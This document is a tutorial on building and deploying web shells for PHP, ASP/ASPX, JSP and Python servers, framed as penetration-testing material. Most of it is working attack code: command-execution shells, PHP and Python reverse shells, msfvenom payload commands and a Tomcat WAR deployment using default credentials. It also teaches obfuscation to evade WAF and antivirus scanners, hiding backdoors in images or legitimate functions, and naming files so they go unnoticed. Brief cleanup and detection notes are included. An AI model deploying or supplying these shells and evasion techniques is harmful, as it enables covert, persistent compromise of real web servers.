# Web Shell Generation Guide

> Comprehensive guide to generating, obfuscating, and deploying web shells across PHP, ASP/ASPX, JSP, and Python web application environments. Covers one-liner shells, full-featured web shells, detection avoidance techniques, and safe deployment practices during authorized penetration tests.

## Introduction

Web shells are malicious scripts uploaded to web servers to maintain persistent remote command execution capabilities. They are one of the most common post-exploitation tools because web applications frequently contain file upload vulnerabilities, directory traversal flaws, or remote code execution (RCE) issues that allow an attacker to place a script on the server. Once deployed, web shells provide a reliable backdoor that persists across reboots and survives patching of the original vulnerability.

Web shell generation covers multiple programming languages and web application platforms. PHP web shells target the most widely deployed server-side language, running on Apache, Nginx, and IIS with PHP support. ASP and ASPX shells target Microsoft IIS servers running classic ASP or the .NET Framework. JSP shells target Java application servers such as Tomcat, WebLogic, and JBoss. Python shells target Django, Flask, or custom Python web servers. Each language has different execution APIs, authentication mechanisms, and evasion requirements.

Detection avoidance is a critical aspect of web shell deployment. Modern web application firewalls (WAFs), endpoint detection and response (EDR) systems, and file integrity monitoring (FIM) tools actively scan for known web shell patterns. Simple web shells using `eval()`, `system()`, or `Runtime.exec()` are quickly detected. Effective web shells employ obfuscation techniques that disguise their functionality while maintaining reliable command execution.

**Learning objectives**:

- Generate minimal one-liner web shells for rapid deployment during exploitation
- Create full-featured web shells with authentication, file management, and stealth features
- Apply obfuscation techniques to evade WAF and malware scanner detection
- Understand detection methods for each web shell type
- Deploy web shells safely during authorized penetration tests with proper documentation
- Clean up web shells completely after engagement completion

**Prerequisites**: Understanding of web application vulnerabilities (file upload, RCE, path traversal). Familiarity with PHP, ASP/ASPX, JSP, or Python web programming. Access to a test lab with target web application platforms.

---

## Practical Steps

### Step 1: PHP Web Shell Generation

PHP is the most common web shell target due to its widespread deployment and powerful execution functions. PHP offers multiple approaches to command execution, each with different detection profiles.

**Minimal One-Liner Shells**

```php
<?php system($_GET['cmd']); ?>

<?php exec($_GET['cmd']); ?>

<?php passthru($_GET['cmd']); ?>

<?php echo shell_exec($_GET['cmd']); ?>

<?php print(`$_GET[cmd]`); ?>

<?php eval($_GET['cmd']); ?>

<?php assert($_GET['cmd']); ?>
```

Usage: upload to target server, then execute commands via:
```bash
curl http://target/uploads/shell.php?cmd=whoami
curl http://target/uploads/shell.php?cmd=cat+/etc/passwd
curl "http://target/uploads/shell.php?cmd=ls+-la+/var/www"
```

**PHP Reverse Shell via Web Shell**

```php
<?php
// PHP reverse shell - executed via web shell command parameter
// Usage: shell.php?cmd=reverse&host=10.0.0.1&port=4444
if (isset($_GET['cmd']) && $_GET['cmd'] === 'reverse') {
    $host = $_GET['host'];
    $port = intval($_GET['port']);
    $sock = fsockopen($host, $port);
    $proc = proc_open('/bin/sh',
        array(0 => $sock, 1 => $sock, 2 => $sock),
        $pipes);
    // Keep alive
    while(true) { sleep(1); }
}
?>
```

**msfvenom PHP Payload Generation**

```bash
# Generate PHP reverse shell with msfvenom
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php

# Generate PHP reverse shell (non-meterpreter)
msfvenom -p php/reverse_php LHOST=10.0.0.1 LPORT=4444 -f raw -o shell_raw.php

# Custom PHP payload with specific parameters
msfvenom -p php/exec ReverseShellBindPort=4444 -f raw -o shell_exec.php
```

**Obfuscated PHP Web Shell**

```php
<?php
// Obfuscated PHP shell using variable function calls and encoding
// Evades basic pattern matching for system/exec/passthru

// Method 1: Variable function call
$f = 'sys'.'tem'; $f($_GET['c']);

// Method 2: Base64-encoded function name
$fn = base64_decode('c3lzdGVt'); // "system"
$fn($_GET['c']);

// Method 3: Callback functions
array_map(base64_decode('c3lzdGVt'), array($_GET['c']));

// Method 4: Variable variables
$x = 's'.'y'.'s'.'t'.'e'.'m';
$x($_REQUEST['c']);

// Method 5: String manipulation
$f = str_replace('x', '', 'sxyxsxtxexm');
$f($_GET['c']);

// Method 6: chr() assembly
$f = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); // "system"
$f($_GET['c']);
?>
```

### Step 2: ASP and ASPX Web Shell Generation

ASP and ASPX shells target Microsoft IIS web servers. Classic ASP uses VBScript or JScript, while ASPX uses the .NET Framework with C# or VB.NET.

**Classic ASP One-Liner**

```asp
<% Execute(Request("cmd")) %>

<% Eval(Request("cmd")) %>

<%
Set wsh = CreateObject("WScript.Shell")
Set exec = wsh.Exec(Request("cmd"))
Response.Write(exec.StdOut.ReadAll())
%>
```

Usage:
```bash
# GET parameter
curl "http://target/uploads/shell.asp?cmd=whoami"

# POST parameter
curl -X POST http://target/uploads/shell.asp -d "cmd=whoami"

# Using cmd parameter in header
curl -H "cmd: whoami" http://target/uploads/shell.asp
```

**ASPX (C#) Web Shell**

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    string cmd = Request["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
```

**ASPX Web Shell via msfvenom**

```bash
# Generate ASPX payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f aspx -o shell.aspx

# Generate ASPX meterpreter payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f aspx -o meter.aspx
```

**Obfuscated ASPX Shell**

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object s, EventArgs e) {
    // Obfuscate class and method names
    string x = Request["c"];
    if (!string.IsNullOrEmpty(x)) {
        byte[] d = Convert.FromBase64String(x);
        string c = System.Text.Encoding.ASCII.GetString(d);
        Process p = new Process();
        p.StartInfo.FileName = System.Text.Encoding.ASCII.GetString(
            Convert.FromBase64String("Y21kLmV4ZQ==")); // "cmd.exe"
        p.StartInfo.Arguments = "/c " + c;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        Response.Write(p.StandardOutput.ReadToEnd());
    }
}
</script>
```

### Step 3: JSP Web Shell Generation

JSP (JavaServer Pages) shells target Java application servers. Java's Runtime.exec() provides command execution, while the Servlet API provides request/response handling.

**Basic JSP Web Shell**

```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
}
%>
```

**JSP Web Shell with Error Output**

```jsp
<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%!
public String execCmd(String cmd) {
    StringBuilder output = new StringBuilder();
    try {
        ProcessBuilder pb = new ProcessBuilder();
        String[] commands;
        String os = System.getProperty("os.name").toLowerCase();
        if (os.contains("win")) {
            commands = new String[]{"cmd.exe", "/c", cmd};
        } else {
            commands = new String[]{"/bin/sh", "-c", cmd};
        }
        pb.command(commands);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }
        p.waitFor();
    } catch (Exception e) {
        output.append("Error: ").append(e.getMessage());
    }
    return output.toString();
}
%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null && !cmd.isEmpty()) {
    out.println("<pre>" + execCmd(cmd) + "</pre>");
}
%>
```

**JSP Web Shell via msfvenom**

```bash
# Generate JSP payload (reverse shell)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.jsp

# Generate WAR file for Tomcat deployment
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war -o shell.war

# Deploy WAR to Tomcat:
curl -u admin:password --upload-file shell.war \
  "http://target:8080/manager/text/deploy?path=/shell"
# Access: http://target:8080/shell/
```

**Obfuscated JSP Shell**

```jsp
<%@ page import="java.io.*" %>
<%!
// Decode and execute -- obfuscates the command string
private static byte[] d(String s) {
    int len = s.length();
    byte[] data = new byte[len / 2];
    for (int i = 0; i < len; i += 2) {
        data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
            + Character.digit(s.charAt(i + 1), 16));
    }
    return data;
}
%>
<%
String e = request.getParameter("e");
if (e != null) {
    String cmd = new String(d(e));
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String l;
    while ((l = r.readLine()) != null) out.println(l);
}
%>
```

### Step 4: Python Web Shell Generation

Python web shells target Python-based web servers, Server-Side Template Injection (SSTI) vulnerabilities, and environments where Python is available for execution.

**Minimal Python Web Shell (CGI)**

```python
#!/usr/bin/env python3
import os
import cgi

print("Content-Type: text/plain\n")
form = cgi.FieldStorage()
cmd = form.getvalue("cmd", "")
if cmd:
    output = os.popen(cmd).read()
    print(output)
```

**Python Flask Web Shell**

```python
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/shell', methods=['GET', 'POST'])
def shell():
    cmd = request.args.get('cmd') or request.form.get('cmd')
    if cmd:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return f"<pre>{result.stdout}\n{result.stderr}</pre>"
    return "No command specified."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

**Python Reverse Shell One-Liners**

```bash
# Python3 reverse shell one-liner
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python3 reverse shell with ssl for encrypted communication
python3 -c 'import socket,ssl,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;ss=ctx.wrap_socket(s,server_hostname="10.0.0.1");ss.connect(("10.0.0.1",4443));os.dup2(ss.fileno(),0);os.dup2(ss.fileno(),1);os.dup2(ss.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Step 5: Web Shell Detection Avoidance

Web Application Firewalls (WAFs) and malware scanners detect web shells through signature matching, behavioral analysis, and file integrity monitoring. Evasion requires understanding these detection methods.

**WAF Signature Evasion**

```php
<?php
// Evade WAF signatures that block common patterns:
// Blocked: system(), exec(), passthru(), shell_exec(), ``
// Blocked: $_GET, $_POST, $_REQUEST
// Blocked: eval(), assert(), preg_replace with /e

// Technique 1: Use less common execution functions
$p = popen($_GET['c'], 'r');
echo fread($p, 4096);
pclose($p);

// Technique 2: proc_open for complex command execution
$descriptors = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$process = proc_open($_GET['c'], $descriptors, $pipes);
echo stream_get_contents($pipes[1]);
proc_close($process);

// Technique 3: PCNTL execution (Linux only)
if (function_exists('pcntl_exec')) {
    pcntl_exec("/bin/sh", array("-c", $_GET['c']));
}

// Technique 4: Usingmail() function for command execution (if sendmail configured)
// mail("attacker@evil.com", "", "", "", "-f " . $_GET['c']);
?>
```

**Hiding Web Shells in Legitimate Files**

```php
<?php
// Technique 1: Hide in image EXIF data (image with embedded PHP)
// Create a valid image with PHP code in EXIF comment:
exiftool -Comment='<?php system($_GET["c"]); ?>' legitimate.jpg
# Then include via LFI: ?page=../../../uploads/legitimate.jpg

// Technique 2: PHP filter chains for code execution without file write
// Use php://filter chains to construct arbitrary PHP code from built-in filters
// This technique executes PHP without writing a file to disk
// Useful when file upload is blocked but LFI exists

// Technique 3: Hide shell in legitimate file with conditional activation
// Normal functionality visible to administrators, shell activated by specific parameter
function processImage($file) {
    // Legitimate image processing function
    $img = imagecreatefromjpeg($file);
    // ... normal processing ...
    
    // Hidden shell: only activates with specific cookie or header
    if (isset($_SERVER['HTTP_X_SECRET']) && $_SERVER['HTTP_X_SECRET'] === 'activate') {
        $c = $_SERVER['HTTP_X_CMD'];
        header('X-Result: ' . trim(shell_exec($c)));
    }
    
    return $img;
}
?>
```

**File Name and Location Evasion**

```bash
# Avoid suspicious file names and locations
# Bad: shell.php, cmd.php, backdoor.php, c99.php, r57.php
# Good: Blend with existing application files

# Naming conventions that blend with application:
# - error_handler.php
# - db_connect.php
# - config_test.php
# - upload_handler.php
# - image_processor.php
# - log_viewer.php

# Location strategies:
# 1. Inside legitimate application directory
#    /var/www/html/includes/config_test.php
# 2. Inside include/library directories (not directly web-accessible)
#    /var/www/html/vendor/autoload_test.php
# 3. As a hidden file
#    /var/www/html/.config.php
# 4. Inside upload directories with many files
#    /var/www/html/uploads/2024/03/profile_img_001.php
```

### Step 6: Web Shell Hardening for Long Operations

For extended penetration tests requiring persistent access, web shells need authentication, logging suppression, and reliability features.

```php
<?php
// Hardened PHP web shell for extended operations
session_start();

// Authentication check
$auth_hash = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== $auth_hash) {
    if (isset($_POST['p'])) {
        if (hash('sha256', $_POST['p']) === $auth_hash) {
            $_SESSION['auth'] = $auth_hash;
        } else {
            http_response_code(404);
            echo "Page not found";
            exit;
        }
    } else {
        http_response_code(404);
        echo "Page not found";
        exit;
    }
}

// Suppress error display
error_reporting(0);
ini_set('display_errors', 0);

// Command execution
if (isset($_POST['c'])) {
    $cmd = $_POST['c'];
    $output = shell_exec($cmd . ' 2>&1');
    echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
}

// File browser
if (isset($_POST['f'])) {
    $file = $_POST['f'];
    if (file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file);
        exit;
    }
}
?>
```

### Step 7: Web Shell Cleanup

Always clean up web shells after an engagement. Leaving web shells on target systems is a security vulnerability and a professional liability.

```bash
# Cleanup script for removing deployed web shells
cat > webshell_cleanup.sh << 'SCRIPT'
#!/bin/bash

# List of deployed web shells with their locations
SHELLS=(
    "/var/www/html/uploads/shell.php"
    "/var/www/html/includes/config_test.php"
    "/opt/tomcat/webapps/shell/shell.jsp"
    "/var/www/html/shell.aspx"
)

echo "[*] Web Shell Cleanup"
echo "[*] Removing ${#SHELLS[@]} deployed shells..."

for shell in "${SHELLS[@]}"; do
    if [ -f "$shell" ]; then
        echo "[+] Removing: $shell"
        rm -f "$shell"
        # Also check for backup files
        rm -f "${shell}.bak" "${shell}~" "${shell}.old"
    else
        echo "[-] Not found (already removed?): $shell"
    fi
done

# Verify cleanup
echo ""
echo "[*] Verification scan for remaining shells..."
find /var/www -name "*.php" -newer /tmp/engagement_start -exec grep -l "system\|exec\|passthru\|shell_exec" {} \; 2>/dev/null

echo "[*] Cleanup complete"
SCRIPT
```

---

## Hands-on Exercises

### Exercise 1: Multi-Language Web Shell Generation

**Scenario**: A target web application accepts file uploads but validates extensions. The server runs Apache with PHP, mod_mono for ASPX, and has a Tomcat instance on port 8080.

1. Generate PHP, ASPX, and JSP web shells using msfvenom
2. For each shell, identify what file extension the server would accept
3. Create obfuscated versions that avoid the patterns `system()`, `exec()`, and `Runtime.exec()`
4. Test each shell against a WAF rule set (ModSecurity CRS)
5. Document which evasion techniques bypass the WAF for each language

**Expected outcome**: Three working web shells (one per language) with obfuscation that bypasses basic WAF signature matching. Documentation of which WAF rules triggered for each obfuscation level.

### Exercise 2: PHP Web Shell Obfuscation Chain

**Scenario**: Deploy a PHP web shell on a target that runs ClamAV malware scanning and ModSecurity WAF. The shell must evade both detection systems.

1. Create a basic PHP web shell and test against ClamAV: `clamscan shell.php`
2. Apply obfuscation techniques (variable functions, base64 encoding, callback functions)
3. Test each obfuscation level against ClamAV and ModSecurity
4. Implement a multi-layer obfuscation that passes both scanners
5. Verify the obfuscated shell still provides reliable command execution

**Expected outcome**: A PHP web shell that evades both ClamAV and ModSecurity detection while maintaining full command execution capability. Step-by-step documentation of which obfuscation techniques were necessary.

### Exercise 3: WAR File Deployment on Tomcat

**Scenario**: A Tomcat server has the manager application accessible with default credentials (admin:admin). Deploy a web shell via WAR deployment.

1. Generate a WAR payload with msfvenom: `msfvenom -p java/jsp_shell_reverse_tcp -f war`
2. Deploy the WAR file via Tomcat manager API
3. Set up a listener to catch the reverse shell
4. Access the deployed shell and execute commands
5. Clean up: undeploy the WAR and remove all artifacts

**Expected outcome**: Successful WAR deployment and reverse shell callback. Clean undeployment with no artifacts remaining on the Tomcat server.

---

## References

1. **OWASP Web Shell Documentation**: https://owasp.org/www-community/web-shell -- Web shell overview and defense
2. **MITRE ATT&CK T1505.003 - Web Shell**: https://attack.mitre.org/techniques/T1505/003/ -- Web shell persistence technique
3. **ModSecurity Core Rule Set**: https://owasp.org/www-project-modsecurity-core-rule-set/ -- WAF rules for web shell detection
4. **PHP Execution Functions**: https://www.php.net/manual/en/ref.exec.php -- PHP command execution API
5. **msfvenom Payload Formats**: https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html -- Format reference including php, aspx, war, jsp
6. **HackTricks - Web Shells**: https://book.hacktricks.xyz/pentesting/pentesting-web/web-shells -- Web shell collection and techniques
7. **PentestMonkey PHP Reverse Shell**: http://pentestmonkey.net/tools/web-shells/php-reverse-shell -- Classic PHP reverse shell reference
8. **NIST - Web Shell Guidance**: https://www.cisa.gov/news-events/cybersecurity-advisories -- Web shell detection and response guidance
